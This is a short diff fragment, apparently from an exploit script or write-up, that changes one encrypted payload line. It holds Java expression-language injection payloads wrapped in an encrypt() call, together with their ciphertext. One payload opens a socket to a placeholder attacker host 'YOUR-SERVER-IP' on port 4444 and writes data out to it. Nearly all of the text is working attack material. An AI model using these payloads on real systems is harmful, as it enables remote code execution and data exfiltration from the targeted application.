@@ -307,4 +307,4 @@ payload = encrypt("${\"\".getClass().forName(\"java.net.URL\").getConstructor(\"
 sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezJ2HOW3hwifihvUlWVwq3wOGsx9CBmbufLUV27KM8P1AdeZQLxEx3fngPyQiDLCwZ7M61uais+hEioVxjYVD/98aonmLgeHSLRNjbsUKD9wR5j2A+F1v1ysLNyYgpnCdSbVNlWtLKL8TltYFry4ZvnGXTL8nJPHv9/WGal0pKQ+j5GVeV8PN/l9NnO0gG4VCSixQdYv39Zr4Oej23hyXYeSW0Gc+jlhQte8rLqPU8UssDh7RkOlUf2ooc2P8gWLaoF1yPohUF9a4yqsLdwAOroM
 
 payload = encrypt("${\"\".getClass().forName(\"java.net.Socket\").getConstructor(\"\".getClass(), Integer.TYPE).newInstance(\"YOUR-SERVER-IP\", 4444).getOutputStream().write(\"File Names: \".getBytes())}")
-sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezKj4GfMxJ9u+3GLGqCk3UZ9ZwbaDnt/BhPvadxzEpulkJ8YA473o0vZtG9DCF6+olV7UYHdmR4mN2SoXAXT1ZfSjAyIfpljjFkBqGNlioOBXWLbAwLnYTl5/BPnHZMEsRjksN22uSf9/8HpP4HzXPPae2LS08pLu/vBD4iXniJuWl+mqmIqkp52sfsmIOecAIw=
+sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezKj4GfMxJ9u+3GLGqCk3UZ9ZwbaDnt/BhPvadxzEpulkJ8YA473o0vZtG9DCF6+olV7UYHdmR4mN2SoXAXT1ZfSLthRFLzNCJ9Mgk+wD3BX5ING7DmRlQCtwgW3efftXKAYbRYdN4r/QxNVWCK6qvl2SJajesOlzOvjEV27YbE3JCnRJSikELWIwNyo3lyuoYY=
